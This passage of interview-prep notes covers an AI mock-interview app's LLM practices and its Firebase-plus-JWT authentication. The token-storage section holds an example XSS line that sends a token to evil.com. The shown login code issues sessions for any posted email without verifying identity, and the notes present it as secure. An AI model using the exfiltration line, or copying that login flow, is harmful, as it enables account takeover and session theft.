| **Skip unnecessary calls** | ✅ Already done | No AI call for empty/timed-out answers |
| **Batch evaluations** | ~40% | Send all 10 answers in ONE call instead of 10 |
| **Shorter prompts** | 20-30% | Compress system instructions |
| **Cache question templates** | 30-50% | Reuse questions for common role+skill combos |
| **Truncate resume text** | 10-20% | Limit to 2000 chars (first page) |

**Already optimized in your code:**
```js
// Skips expensive AI call when answer is empty or timed out:
if (!answer) { question.score = 0; question.feedback = "You did not submit an answer."; }
if (timeTaken > question.timeLimit) { question.score = 0; /* skip AI */ }
```

**🎤 Interview-ready answer:**

> *"I already optimize by using Flash Lite and skipping AI calls for empty or timed-out answers. The biggest remaining win is batching all 10 answer evaluations into a single API call — that eliminates system prompt overhead 9 times. I'd also cache question templates for common roles and truncate resume text to reduce input tokens."*

---

### ❓ Q12: How would you improve response latency?

**The Gemini API call is 95% of total latency (~1-3 seconds).**

```mermaid
flowchart LR
    A["User submits"] --> B["Server ~50ms"]
    B --> C["MongoDB ~100ms"]
    C --> D["⚡ Gemini 1-3s"]
    D --> E["Save DB ~100ms"]
    E --> F["Response ~50ms"]
    style D fill:#ef4444,color:white
```

| Technique | Reduction | How |
|---|---|---|
| **Response streaming** | Perceived ~80% | Use `streamGenerateContent` + SSE. User sees text building live. |
| **Shorter prompts** | ~15-25% | Fewer input tokens = faster processing |
| **Pre-fetch next question** | Eliminates wait | Read next question from DB during current evaluation |
| **Smaller model** | ✅ Already done | Flash Lite is fastest variant |

**🎤 Interview-ready answer:**

> *"The Gemini call is the bottleneck. The biggest UX improvement is response streaming — using streamGenerateContent with Server-Sent Events to show AI feedback building in real-time instead of a 3-second spinner. I'd also pre-fetch the next question from MongoDB while the current answer is being evaluated."*

---

### ❓ Q13: How do you validate AI-generated interview questions?

**Current validation:**
```js
const questionsArray = aiResponse.split("\n").map(q => q.trim()).filter(q => q.length > 0).slice(0, 10);
if (questionsArray.length === 0) return res.status(500).json({message: "AI failed"});
```

✅ Non-empty check, ✅ Whitespace cleanup, ✅ Max 10 cap

**NOT validated:** ❌ Word count, ❌ Relevance to resume, ❌ Duplicate detection, ❌ Must end with `?`

**Better validation:**
```js
const questionsArray = aiResponse.split("\n").map(q => q.trim())
    .filter(q => q.length > 0)
    .filter(q => q.split(/\s+/).length >= 10 && q.split(/\s+/).length <= 35)
    .filter(q => q.endsWith("?"))
    .slice(0, 10);
const uniqueQuestions = [...new Set(questionsArray)];
```

---

### ❓ Q14: Can an LLM response be trusted blindly?

**Answer: Absolutely not.**

```mermaid
flowchart TD
    A["Why you can't trust LLM output"] --> B["Format violations<br/>'JSON only' → adds code fences anyway"]
    A --> C["Hallucinations<br/>Invents facts that sound real"]
    A --> D["Inconsistency<br/>Same prompt → different output"]
    A --> E["Prompt injection<br/>Malicious input overrides instructions"]
```

**Where your code already doesn't trust AI:**
- Strips code fences (AI adds them despite "return ONLY JSON")
- Parses in try-catch (AI might return non-JSON text)
- Hardcodes scores for edge cases (doesn't trust AI to handle empty answers)

**🎤 Interview-ready answer:**

> *"Never. LLM output should be treated like untrusted user input. I sanitize every response by stripping code fences, wrap every JSON.parse in try-catch, and skip AI calls for edge cases where I can hardcode the result. LLMs are non-deterministic and hallucinate. For production, I'd also validate score ranges, check feedback length, and add prompt injection protection."*

---

### ❓ Q15: How would you test an AI-generated response?

**AI testing is fundamentally different — same input produces different output.**

```js
// Can't do this:
expect(response.score).toBe(7);  // ❌ Next run might be 8

// Must test PROPERTIES instead:
describe('AI evaluation', () => {
    test('returns valid schema', async () => {
        const response = await evaluateAnswer("What is React?", "React is a UI library");
        expect(response).toHaveProperty('confidence');
        expect(response).toHaveProperty('feedback');
        expect(response.confidence).toBeGreaterThanOrEqual(0);
        expect(response.confidence).toBeLessThanOrEqual(10);
        expect(typeof response.feedback).toBe('string');
        expect(response.feedback.length).toBeGreaterThan(0);
    });
});
```

| Test Type | What to Test |
|---|---|
| **Schema** | All expected fields exist |
| **Types** | Numbers are numbers, strings are strings |
| **Ranges** | Scores between 0-10 |
| **Format** | Questions end with `?` |
| **Boundary** | Empty resume, one-word answer |
| **Adversarial** | Prompt injection attempts |

---

### ❓ Q16: How would you detect hallucinations?

**Hallucination = AI generates confident-sounding but factually incorrect information.**

| Task | Risk | Detection |
|---|---|---|
| Resume parsing | Medium — AI invents skills | Cross-reference: check if extracted skills appear in resume text |
| Question generation | Low — creative output | No factual "truth" to violate |
| Answer evaluation | High — random scoring | Run same evaluation 3x; if scores vary by >3 → flag as unreliable |

**Practical detection for resume parsing:**
```js
const verifiedSkills = parsed.skills.filter(skill =>
    resumeText.toLowerCase().includes(skill.toLowerCase())
);
if (verifiedSkills.length < parsed.skills.length * 0.5) {
    console.warn("Possible hallucination: AI invented skills not in resume");
}
```

**🎤 Interview-ready answer:**

> *"For resume parsing, I'd cross-reference extracted skills against the actual text — if the AI claims 'Kubernetes' but it's not in the resume, that's hallucination. For scoring, I'd run the same evaluation 3 times and flag results where scores vary by more than 3 points. I'd also use simple keyword-matching as a sanity check — if AI gives 9/10 but the answer has zero relevant keywords, something's wrong."*

---

### ❓ Q17: What is temperature?

**Temperature** controls **randomness** of AI output (0 to 2).

```
Temperature = 0  → Always picks highest-probability word → Deterministic
Temperature = 1  → Picks proportionally → Balanced variety
Temperature = 2  → Flattens probabilities → Wild randomness
```

**How it works:** AI generates probability distribution over next tokens. Temperature scales these:

```
Tokens:         ["React", "A",    "It",   "JS"]
Probabilities:  [0.40,    0.25,   0.20,   0.15]

Temp = 0:  Always picks "React"
Temp = 1:  "React" 40% of the time, "A" 25%, etc.
Temp = 2:  Nearly equal chance for all words
```

**Your project doesn't set temperature (uses Gemini default ~0.7-1.0).**

**What you should do:**
```js
const payload = {
    contents, systemInstruction,
    generationConfig: {
        temperature: 0.2,  // Low for JSON parsing/scoring (consistent)
        // OR 0.8 for question generation (creative variety)
    }
};
```

**🎤 Interview-ready answer:**

> *"Temperature controls output randomness. At 0, the model always picks the most probable token — deterministic and consistent. At 1, it samples proportionally — giving creative variety. I'd use low temperature (0.2) for resume parsing and scoring where I need consistent JSON, and higher (0.8) for question generation where I want variety so repeat users don't get identical questions."*

---

### ❓ Q18: What is a token?

**A token is the basic processing unit — NOT a word, but a subword piece.**

```
"InterviewIQ is an AI-powered platform"
Tokens: ["Interview", "IQ", " is", " an", " AI", "-", "powered", " platform"]
         ← 8 tokens for 6 words →

Rule of thumb: 1 token ≈ 4 characters ≈ 0.75 words
               100 tokens ≈ 75 words
```

**Why tokens matter:**
1. **Cost** — You pay per input + output token
2. **Context limits** — Models have maximum total tokens per request
3. **Latency** — More tokens = slower processing

**Your project per interview: ~12,000 tokens total (12 calls × ~1000 each)**

**🎤 Interview-ready answer:**

> *"A token is a subword unit — roughly 4 characters or 0.75 words. Tokens matter for cost (billed per token), context limits (max input+output), and latency (more tokens = slower). That's why I sanitize whitespace before sending — it reduces token count. Each interview session uses roughly 12,000 tokens across 12 API calls."*

---

### ❓ Q19: What is context length?

**Context length = maximum tokens the model can process in one request (input + output).**

| Model | Context Length |
|---|---|
| **Gemini Flash Lite (yours)** | 1,000,000 tokens |
| GPT-4 | 128,000 tokens |
| GPT-3.5 | 16,384 tokens |

With 1M token context, length is never an issue for resumes (~1500 tokens). But with GPT-3.5, a very long document could exceed the limit.

Your whitespace sanitization (`.replace(/\s+/g, " ")`) reduces token count as a preventive measure.

**🎤 Interview-ready answer:**

> *"Context length is the max tokens per request. Gemini Flash Lite has 1M tokens — practically unlimited for resumes. But with smaller models, a long resume could exceed limits. That's why I sanitize text — reducing tokens prevents context overflow and saves cost."*

---

### ❓ Q20: What is prompt engineering?

**Prompt engineering = designing AI instructions for reliable, predictable output.**

**6 techniques used in your project:**

```mermaid
flowchart TD
    A["Prompt Engineering<br/>Techniques"] --> B["Role Assignment<br/>'You are an interviewer'"]
    A --> C["Format Specification<br/>'Return ONLY valid JSON'"]
    A --> D["Constraints<br/>'15-25 words per question'"]
    A --> E["Negative Instructions<br/>'Do NOT number them'"]
    A --> F["Output Schema<br/>{confidence: number, ...}"]
    A --> G["Context Injection<br/>'Role: Frontend Dev, Skills:...'"]
```

**🎤 Interview-ready answer:**

> *"Prompt engineering is the systematic design of AI instructions. I use six techniques: role assignment for persona, format constraints for word counts, negative instructions to suppress unwanted formatting, output schemas as templates, context injection for personalization, and explicit JSON structures. The key learning: negative instructions ('do NOT') are often more effective than positive ones because LLMs naturally want to be over-helpful."*

---

### ❓ Q21: What is zero-shot prompting?

**Zero-shot = asking AI to perform a task with ZERO examples.**

```
// Zero-shot (what you use):
"Extract structured data from resume. Return JSON: {role, experience, ...}"
→ No example input/output pair provided
→ Relies on model's pre-trained knowledge
```

**All 3 of your prompts are zero-shot.** It works because these tasks (extraction, generation, scoring) are common patterns Gemini has seen millions of times in training.

**When zero-shot fails:** Very domain-specific tasks (medical diagnosis, legal analysis, custom scoring rubrics)

---

### ❓ Q22: What is few-shot prompting?

**Few-shot = providing a few examples in the prompt to teach the pattern.**

```
// Few-shot version of resume parsing (NOT in your current code):

System: "Extract data from resumes. Here are examples:"

Example 1:
Input: "Jane Smith, 5 years, React developer, built Netflix clone"
Output: {"role":"React Developer","experience":"5 years","projects":["Netflix clone"],"skills":["React"]}

Example 2:
Input: "John Doe, 2 years, backend engineer, knows Python, built chat app"
Output: {"role":"Backend Engineer","experience":"2 years","projects":["Chat app"],"skills":["Python"]}

Now extract from this resume:
[actual resume text]
```

**When to use few-shot vs zero-shot:**

| Scenario | Use |
|---|---|
| Common task, clear instructions | Zero-shot (your current approach) |
| AI keeps getting format wrong | Few-shot — show it correct examples |
| Domain-specific scoring rubric | Few-shot — show example scores with reasoning |
| New/unusual output format | Few-shot — model needs to "see" the pattern |

**Why you don't use few-shot currently:**
- Your tasks are common → zero-shot works fine
- Few-shot uses more tokens → costs more
- Examples take up context window space

**🎤 Interview-ready answer:**

> *"Few-shot prompting provides examples in the prompt to teach the AI the expected pattern. I currently use zero-shot because my tasks are common enough that Gemini handles them without examples. But if I noticed the AI consistently getting the format wrong — like returning scores outside 0-10 — I'd switch to few-shot and show 2-3 example evaluations with correct scores. The tradeoff is that examples consume extra tokens, increasing cost."*

---

### ❓ Q23: What is structured output?

**Structured output = forcing the AI to return data in a machine-parseable format (JSON, XML, CSV) instead of free-form text.**

```mermaid
flowchart LR
    subgraph "❌ Unstructured Output"
        A1["'The candidate scored about 7 out of 10<br/>on confidence. Their communication was<br/>decent, maybe a 6. The answer was mostly<br/>correct so I'd give 8 for correctness.'"]
    end
    
    subgraph "✅ Structured Output (your approach)"
        A2["{<br/>  'confidence': 7,<br/>  'communication': 6,<br/>  'correctness': 8,<br/>  'finalScore': 7,<br/>  'feedback': 'Good answer, add examples'<br/>}"]
    end
```

**Why structured output is essential for your project:**
- You need to save scores to MongoDB fields → must be individual numbers
- You need to display scores in charts (Recharts) → must be numeric
- You need to calculate averages → `JSON.parse()` must succeed
- Free-form text would require another AI call to extract numbers!

**Your project enforces structured output through:**
1. System prompt: `"Return ONLY valid JSON in this format: {...}"`
2. Schema template with exact field names and types
3. Post-processing: strip code fences → `JSON.parse()`

---

### ❓ Q24: How would you force an LLM to return JSON?

**Answer — 5 techniques, from weakest to strongest:**

| # | Technique | Reliability | Used in your project? |
|---|---|---|---|
| 1 | Ask nicely: "Please return JSON" | 🔴 Low | ❌ |
| 2 | Be explicit: "Return ONLY valid JSON. No other text." | 🟡 Medium | ✅ Yes |
| 3 | Provide schema template | 🟢 High | ✅ Yes |
| 4 | Add negative instructions: "No code fences, no explanation" | 🟢 High | ✅ Yes |
| 5 | Use API-level JSON mode (Gemini's `response_mime_type`) | 🟢🟢 Highest | ❌ Not used |

**Technique 5 — what you're NOT using but should:**

```js
// Gemini supports forcing JSON at the API level:
const payload = {
    contents,
    systemInstruction,
    generationConfig: {
        responseMimeType: "application/json",  // ← Forces JSON output
        responseSchema: {                       // ← Defines exact schema
            type: "object",
            properties: {
                confidence: { type: "number" },
                communication: { type: "number" },
                correctness: { type: "number" },
                finalScore: { type: "number" },
                feedback: { type: "string" }
            }
        }
    }
};
```

With `responseMimeType: "application/json"`, Gemini **guarantees** valid JSON — no code fences, no extra text, no parse failures. You wouldn't need the sanitization step at all.

**🎤 Interview-ready answer:**

> *"I use three techniques: explicit instructions ('Return ONLY valid JSON'), a schema template showing exact field names and types, and negative instructions ('no code fences'). But the most reliable approach I'd add is Gemini's API-level JSON mode — setting responseMimeType to 'application/json' — which guarantees valid JSON at the model output layer, eliminating the need for post-processing sanitization entirely."*

---

### ❓ Q25: How would you test an AI application?

**Answer — a 5-layer testing strategy:**

```mermaid
flowchart TD
    A["Testing an AI Application"] --> B["Layer 1: Unit Tests<br/>Test non-AI code normally"]
    A --> C["Layer 2: Mock AI Tests<br/>Mock askAi() with fixed responses"]
    A --> D["Layer 3: Schema Tests<br/>Validate AI output structure"]
    A --> E["Layer 4: Integration Tests<br/>Real AI calls, test properties"]
    A --> F["Layer 5: Regression Snapshots<br/>Detect quality degradation"]
```

**Layer 1 — Unit tests (no AI involved):**
```js
// Test the sanitization logic independently:
test('strips code fences', () => {
    const input = '```json\n{"role":"dev"}\n```';
    const cleaned = input.replace(/```json/g, "").replace(/```/g, "").trim();
    expect(JSON.parse(cleaned)).toEqual({role: "dev"});
});
```

**Layer 2 — Mock AI tests (fast, deterministic):**
```js
// Mock askAi to return a controlled response:
jest.mock('../services/openRouter.service.js');
askAi.mockResolvedValue('{"confidence":8,"communication":7,"correctness":9,"finalScore":8,"feedback":"Good"}');

test('submitAnswer processes AI response correctly', async () => {
    const result = await submitAnswer(interviewId, 0, "React is a library", 30);
    expect(result.feedback).toBe("Good");
});
```

**Layer 3 — Schema validation (run against real AI):**
```js
test('resume parsing returns valid schema', async () => {
    const result = await analyzeResume(sampleResumeText);
    expect(result).toHaveProperty('role');
    expect(result).toHaveProperty('skills');
    expect(Array.isArray(result.skills)).toBe(true);
});
```

**Layer 4 — Integration (real calls, slow, expensive):**
```js
test('full interview flow completes', async () => {
    const resume = await analyzeResume(realResume);
    const questions = await generateQuestions(resume);
    expect(questions.length).toBe(10);
    
    const evaluation = await evaluateAnswer(questions[0], "My answer");
    expect(evaluation.confidence).toBeGreaterThanOrEqual(0);
    expect(evaluation.confidence).toBeLessThanOrEqual(10);
});
```

**Layer 5 — Regression snapshots:**
- Save 50 known-good outputs to a file
- After any prompt change, re-run and compare
- If >20% fail schema validation → the prompt change broke something

**🎤 Interview-ready answer:**

> *"I'd test at five layers: unit tests for non-AI logic like sanitization, mock tests where I stub askAi() with fixed responses to test controller logic deterministically, schema validation tests that verify real AI output has correct fields and types, integration tests that run the full flow with real API calls, and regression snapshots — a saved set of known-good outputs that I re-run after prompt changes to detect quality degradation. Mocking is key because it lets me test business logic without expensive, non-deterministic AI calls."*

---

## Section 18: Authentication — Interview Q&A (Deep Dive)

> This section covers 9 authentication interview questions.
> Your project uses a **hybrid Firebase + JWT architecture** — understand WHY both exist and WHAT each does.

---

### ❓ Q1: Why Firebase authentication?

**Answer:**

Your project uses Firebase for **one specific thing**: the **Google OAuth popup**. Firebase is NOT your auth system — it's your **identity provider**.

```mermaid
flowchart LR
    subgraph "What Firebase does (identity verification)"
        A["Opens Google login popup"] --> B["Google verifies the user"]
        B --> C["Returns: name + email"]
    end
    
    subgraph "What YOUR server does (session management)"
        D["Receives name + email"] --> E["Find or create user in MongoDB"]
        E --> F["Generate JWT token"]
        F --> G["Set HTTP-only cookie"]
    end
    
    C --> D
```

**Why NOT build Google OAuth from scratch?**

| DIY Google OAuth | Firebase Auth |
|---|---|
| Register app on Google Cloud Console | ✅ Already handled |
| Implement OAuth 2.0 authorization code flow | ✅ `signInWithPopup(auth, provider)` — one line |
| Handle redirect URIs, token exchange, PKCE | ✅ All handled internally |
| Validate Google's ID token yourself | ✅ Firebase validates and returns user object |
| 200+ lines of code | 5 lines of code |

**Your Firebase setup (`utils/firebase.js`):**
```js
import { initializeApp } from "firebase/app";
import { getAuth, GoogleAuthProvider } from "firebase/auth";

const firebaseConfig = {
    apiKey: import.meta.env.VITE_FIREBASE_APIKEY,
    authDomain: "interviewiq2-b58e9.firebaseapp.com",
    projectId: "interviewiq2-b58e9",
    // ...
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

export { auth, provider };
```

**Key distinction for interviews:**

> Firebase handles **"Who is this person?"** (identity).
> Your JWT handles **"Is this person allowed to make this request?"** (session).

**🎤 Interview-ready answer:**

> *"I use Firebase specifically for Google OAuth — it handles the complex OAuth 2.0 flow, popup management, and Google token validation in a single line of code. But Firebase doesn't manage my sessions. Once I get the user's name and email from Firebase, my own server creates a JWT token and sets it as an HTTP-only cookie. Firebase is the identity provider; my JWT is the session manager. This hybrid approach gives me the convenience of Firebase for social login with full control over session management on my server."*

---

### ❓ Q2: What happens during login?

**Answer — trace the complete flow from button click to logged-in state:**

```mermaid
sequenceDiagram
    participant User as 👤 User
    participant React as ⚛️ React (Auth.jsx)
    participant Firebase as 🔥 Firebase
    participant Google as 🌐 Google OAuth
    participant Express as 🖥️ Express Server
    participant DB as 🗄️ MongoDB
    participant Redux as 📦 Redux Store

    User->>React: Clicks "Continue with Google"
    React->>Firebase: signInWithPopup(auth, provider)
    Firebase->>Google: Opens Google login popup
    User->>Google: Selects Google account, grants permission
    Google-->>Firebase: OAuth token + user profile
    Firebase-->>React: response.user = {displayName, email, ...}
    
    React->>React: Extract name + email from response.user
    React->>Express: POST /api/auth/google<br/>{name: "Siddhesh", email: "sid@gmail.com"}<br/>withCredentials: true
    
    Express->>DB: User.findOne({email: "sid@gmail.com"})
    
    alt User exists
        DB-->>Express: Existing user document
    else New user
        Express->>DB: User.create({name, email})<br/>credits auto-set to 100
        DB-->>Express: New user document
    end
    
    Express->>Express: genToken(user._id)<br/>jwt.sign({userId}, JWT_SECRET, {expiresIn:"7d"})
    Express->>Express: res.cookie("token", jwt, {httpOnly, secure, sameSite:"none"})
    Express-->>React: 200 OK + user document JSON
    
    Note over Express,React: Cookie is set by the browser automatically<br/>from the Set-Cookie response header
    
    React->>Redux: dispatch(setUserData(result.data))
    Redux->>React: UI re-renders with user data<br/>Navbar shows name + credits
```

**Your actual code (step by step):**

**Step 1 — Frontend (`Auth.jsx`):**
```js
const handleGoogleAuth = async () => {
    try {
        // Step 1a: Firebase opens Google popup, user picks account
        const response = await signInWithPopup(auth, provider)
        let User = response.user
        let name = User.displayName    // "Siddhesh Pawar"
        let email = User.email         // "sid@gmail.com"
        
        // Step 1b: Send name+email to YOUR server (not Firebase's)
        const result = await axios.post(
            ServerUrl + "/api/auth/google",
            { name, email },
            { withCredentials: true }   // ← Tells browser to accept Set-Cookie
        )
        
        // Step 1c: Save user data to Redux global state
        dispatch(setUserData(result.data))
    } catch (error) {
        console.error(error)
        alert(error.response?.data?.message || "Failed to sign in")
        dispatch(setUserData(null))     // Clear any stale user data
    }
}
```

**Step 2 — Backend (`auth.controller.js`):**
```js
export const googleAuth = async (req, res) => {
    try {
        const { name, email } = req.body
        
        // Step 2a: Check if user already exists
        let user = await User.findOne({ email })
        if (!user) {
            // Step 2b: First-time user — create account
            user = await User.create({ name, email })
            // Mongoose schema gives default credits: 100
        }
        
        // Step 2c: Generate JWT with user's MongoDB _id
        let token = await genToken(user._id)
        
        // Step 2d: Set JWT as HTTP-only cookie
        res.cookie("token", token, {
            http: true,          // ⚠️ BUG: Should be httpOnly: true
            secure: true,        // Only send over HTTPS
            sameSite: "none",    // Allow cross-origin (different Render subdomains)
            maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
        })
        
        // Step 2e: Return user data (NOT the token — it's in the cookie)
        return res.status(200).json(user)
    } catch (error) {
        return res.status(500).json({ message: `Google auth error ${error}` })
    }
}
```

**Step 3 — Session restore on page refresh (`App.jsx`):**
```js
// Runs once when the app loads
useEffect(() => {
    const getUser = async () => {
        try {
            // Browser automatically sends the cookie (withCredentials)
            const result = await axios.get(
                ServerUrl + "/api/user/current-user",
                { withCredentials: true }
            )
            dispatch(setUserData(result.data))  // Restore logged-in state
        } catch (error) {
            dispatch(setUserData(null))          // No valid cookie → not logged in
        }
    }
    getUser()
}, [dispatch])
```

**🎤 Interview-ready answer:**

> *"When the user clicks 'Continue with Google', Firebase opens a Google OAuth popup. After the user selects their account, Firebase returns the user's name and email. My frontend then sends these to my Express server, which either finds an existing user or creates a new one in MongoDB. The server generates a JWT containing the user's MongoDB ID, sets it as an HTTP-only cookie, and returns the user data. The frontend saves this to Redux for global access. On page refresh, App.jsx calls /api/user/current-user — the browser auto-sends the cookie, the server verifies the JWT, and the session is restored without re-login."*

---

### ❓ Q3: How does authentication differ from authorization?

**Answer:**

```mermaid
flowchart TD
    subgraph "Authentication (AuthN) — WHO are you?"
        A["User clicks 'Login with Google'"] --> B["Firebase verifies identity"]
        B --> C["Server creates JWT"]
        C --> D["✅ User is AUTHENTICATED<br/>'I know you are Siddhesh'"]
    end
    
    subgraph "Authorization (AuthZ) — WHAT can you do?"
        E["Authenticated user tries to start interview"] --> F{"Does user have ≥50 credits?"}
        F -->|"Yes"| G["✅ AUTHORIZED — proceed"]
        F -->|"No"| H["❌ NOT AUTHORIZED<br/>'You don't have permission to do this'"]
    end
    
    D --> E
```

| Aspect | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| **Question** | "Who are you?" | "What are you allowed to do?" |
| **When** | At login time | At every protected action |
| **How (your code)** | `signInWithPopup` + JWT generation | `isAuth` middleware + credit checks |
| **Failure response** | 401 Unauthorized — "You need to log in" | 403 Forbidden — "You don't have permission" |
| **Data used** | Credentials (Google token → name/email) | Permissions (credits, ownership) |

**In your actual code, both are happening:**

```js
// AUTHENTICATION — isAuth middleware (middlewares/isAuth.js):
const isAuth = async (req, res, next) => {
    let { token } = req.cookies
    if (!token) {
        return res.status(400).json({ message: "user does not have a token" })
        // ↑ Authentication failure: "I don't know who you are"
    }
    const verifyToken = jwt.verify(token, process.env.JWT_SECRET)
    req.userId = verifyToken.userId
    next()  // ✅ You are authenticated — proceed to authorization checks
}

// AUTHORIZATION — in generateQuestion controller:
const user = await User.findById(req.userId)
if (user.credits < 50) {
    return res.status(400).json({ message: "Not enough credits" })
    // ↑ Authorization failure: "I know who you are, but you can't do this"
}
```

**Another authorization example — you can only see YOUR interviews:**
```js
// getMyInterviews controller:
const interviews = await Interview.find({ userId: req.userId })
// ↑ Only returns interviews belonging to the authenticated user
// User A cannot see User B's interview history
```

**🎤 Interview-ready answer:**

> *"Authentication is 'who are you' — verified through Firebase login and JWT tokens. Authorization is 'what can you do' — checked through business logic like credit balance. In my code, the isAuth middleware handles authentication by verifying the JWT. Authorization happens in controllers — like checking if a user has enough credits to start an interview, or only returning interviews that belong to that specific user. A user can be authenticated (valid JWT) but still unauthorized (0 credits)."*

---

### ❓ Q4: What is JWT?

**Answer:**

**JWT = JSON Web Token** — a self-contained, signed token that proves identity without server-side storage.

```mermaid
flowchart LR
    subgraph "JWT Structure (3 parts separated by dots)"
        A["Header<br/>{alg:'HS256', typ:'JWT'}"] -->|"Base64"| D["eyJhbGci..."]
        B["Payload<br/>{userId:'672abc', exp:1700000}"] -->|"Base64"| E["eyJ1c2Vy..."]
        C["Signature<br/>HMAC-SHA256(header+payload, SECRET)"] --> F["SflKxwRJ..."]
    end
    
    D --- G["eyJhbGci.eyJ1c2Vy.SflKxwRJ"]
    E --- G
    F --- G
```

**Your token generation (`config/token.js`):**
```js
const genToken = async (userId) => {
    const token = jwt.sign(
        { userId },              // PAYLOAD: data embedded in the token
        process.env.JWT_SECRET,  // SECRET: only your server knows this
        { expiresIn: "7d" }      // EXPIRY: token dies after 7 days
    )
    return token
}
```

**How verification works:**

```mermaid
flowchart TD
    A["Token arrives in cookie"] --> B["Split into header.payload.signature"]
    B --> C["Take header + payload"]
    C --> D["Recompute: HMAC-SHA256(header+payload, JWT_SECRET)"]
    D --> E{"Computed signature === received signature?"}
    E -->|"Yes"| F["✅ Token is genuine + unmodified<br/>Extract userId from payload"]
    E -->|"No"| G["❌ Token was tampered with<br/>Reject the request"]
    
    F --> H{"Is token expired?"}
    H -->|"exp > now"| I["✅ Token is valid — proceed"]
    H -->|"exp < now"| J["❌ Token has expired — reject"]
```

**Why JWTs are "stateless":**

```mermaid
flowchart TD
    subgraph "❌ Session-based (stateful)"
        A1["Login → Server stores session in memory/DB"]
        B1["Every request → Server looks up session ID"]
        C1["Problem: If server restarts → all sessions lost!"]
        D1["Problem: With 3 servers → sessions not shared!"]
    end
    
    subgraph "✅ JWT (stateless)"
        A2["Login → Server creates signed token → gives to client"]
        B2["Every request → Server VERIFIES the signature"]
        C2["Server stores NOTHING — token contains all info"]
        D2["Works across multiple servers — same SECRET verifies everywhere"]
    end
```

**🎤 Interview-ready answer:**

> *"JWT is a signed token with three parts: a header specifying the algorithm, a payload containing user data like the MongoDB userId and expiry time, and a signature computed using HMAC-SHA256 with a server-side secret. The key advantage is it's stateless — the server doesn't store any session data. To verify, the server recomputes the signature and compares it. If they match and the token hasn't expired, the request is authenticated. This makes JWT ideal for distributed systems because any server with the same secret can verify any token."*

---

### ❓ Q5: Why use authentication?

**Answer:**

Without authentication, your API is completely open:

```mermaid
flowchart TD
    subgraph "❌ Without Authentication"
        A1["Anyone calls POST /api/interview/generate-questions"] --> B1["Server generates questions<br/>Deducts 50 credits from... who?"]
        C1["Anyone calls GET /api/interview/get-interview"] --> D1["Returns ALL users' interviews<br/>No way to filter by user"]
        E1["Anyone calls POST /api/payment/verify-payment"] --> F1["Could add credits to any account"]
    end
    
    subgraph "✅ With Authentication"
        A2["POST /generate-questions<br/>+ JWT cookie"] --> B2["isAuth extracts userId<br/>Deducts from correct user"]
        C2["GET /get-interview<br/>+ JWT cookie"] --> D2["Returns only THIS user's interviews"]
        E2["POST /verify-payment<br/>+ JWT cookie"] --> F2["Credits go to correct user"]
    end
```

**5 things authentication protects in your project:**

| What | Without Auth | With Auth |
|---|---|---|
| **Credit deduction** | Can't know whose credits to deduct | `req.userId` identifies the paying user |
| **Interview ownership** | Anyone sees everyone's interviews | `Interview.find({ userId: req.userId })` |
| **Resume privacy** | Anyone's resume is accessible | Only the uploader can access their data |
| **Payment security** | Credits could go to wrong account | Payment linked to authenticated user |
| **Abuse prevention** | Bots could make unlimited AI calls | Each request tied to a real user account |

**🎤 Interview-ready answer:**

> *"Authentication is essential because every core operation needs to know WHO is making the request. Without it, I can't deduct credits from the right user, filter interviews by owner, or ensure payments go to the correct account. The isAuth middleware runs before every protected endpoint, extracting the userId from the JWT and attaching it to the request. This userId then drives all business logic — credit checks, data ownership, payment processing."*

---

### ❓ Q6: Where should authentication tokens be stored?

**Answer — this is a CRITICAL security question:**

```mermaid
flowchart TD
    subgraph "❌ localStorage — Vulnerable to XSS"
        A1["Token in localStorage"] --> B1["Any JavaScript on the page can read it:<br/>localStorage.getItem('token')"]
        B1 --> C1["XSS attack: Malicious script steals token<br/>fetch('evil.com?token=' + localStorage.getItem('token'))"]
        C1 --> D1["🔴 Attacker has full access to user's account"]
    end
    
    subgraph "✅ HTTP-only Cookie — Your approach"
        A2["Token in HTTP-only cookie"] --> B2["JavaScript CANNOT access it:<br/>document.cookie → '' (empty!)"]
        B2 --> C2["XSS attack: Script runs but CAN'T read the token"]
        C2 --> D2["🟢 Token is safe, sent automatically by browser"]
    end
    
    subgraph "⚠️ sessionStorage — Slightly better"
        A3["Token in sessionStorage"] --> B3["Same XSS vulnerability as localStorage"]
        B3 --> C3["Cleared when tab closes — but still vulnerable while open"]
    end
```

**Your code sets an HTTP-only cookie:**
```js
res.cookie("token", token, {
    http: true,          // ⚠️ BUG: Should be httpOnly: true
    secure: true,        // Only sent over HTTPS connections
    sameSite: "none",    // Allow cross-origin (frontend ≠ backend domain)
    maxAge: 7 * 24 * 60 * 60 * 1000  // Expires in 7 days
})
```

**Each cookie property explained:**

| Property | Value | Purpose |
|---|---|---|
| `httpOnly` | `true` | JavaScript CANNOT access this cookie — prevents XSS theft |
| `secure` | `true` | Cookie only sent over HTTPS — prevents network sniffing |
| `sameSite` | `"none"` | Allow cross-origin requests — needed because frontend and backend are on different Render subdomains |
| `maxAge` | 7 days (ms) | Cookie expires after 7 days — user must re-login |

> ⚠️ **Bug alert:** Your code says `http: true` but the correct Express property is `httpOnly: true` (camelCase). With `http: true`, Express ignores this unknown property and the cookie is NOT actually HTTP-only. This means `document.cookie` CAN read it — an XSS vulnerability.

**Comparison table for interviews:**

| Storage | XSS Safe? | CSRF Safe? | Sent Automatically? | Persists Across Tabs? |
|---|---|---|---|---|
| `localStorage` | ❌ No | ✅ Yes | ❌ No (manual header) | ✅ Yes |
| `sessionStorage` | ❌ No | ✅ Yes | ❌ No | ❌ No |
| **HTTP-only cookie** | ✅ Yes | ❌ Needs CSRF protection | ✅ Yes (browser sends) | ✅ Yes |
| In-memory variable | ✅ Yes | ✅ Yes | ❌ No | ❌ No (lost on refresh) |

**🎤 Interview-ready answer:**

> *"I store tokens in HTTP-only cookies because JavaScript cannot access them — this prevents XSS attacks from stealing the token. With localStorage, any script on the page can read the token via localStorage.getItem. With HTTP-only cookies, even if an XSS attack executes malicious JavaScript, document.cookie returns empty. The tradeoff is cookies are vulnerable to CSRF, but I mitigate that with sameSite and CORS restrictions. I also set secure:true so the cookie only travels over HTTPS."*

---

### ❓ Q7: What happens if a token expires?

**Answer:**

Your JWT expires after 7 days (`{expiresIn: "7d"}`). Here's what happens:

```mermaid
sequenceDiagram
    participant Browser as 🌐 Browser
    participant Express as 🖥️ Express
    participant JWT as 🔑 jwt.verify()

    Note over Browser: Day 8: User opens app after a week
    Browser->>Express: GET /api/user/current-user<br/>Cookie: token=eyJhbG... (expired)
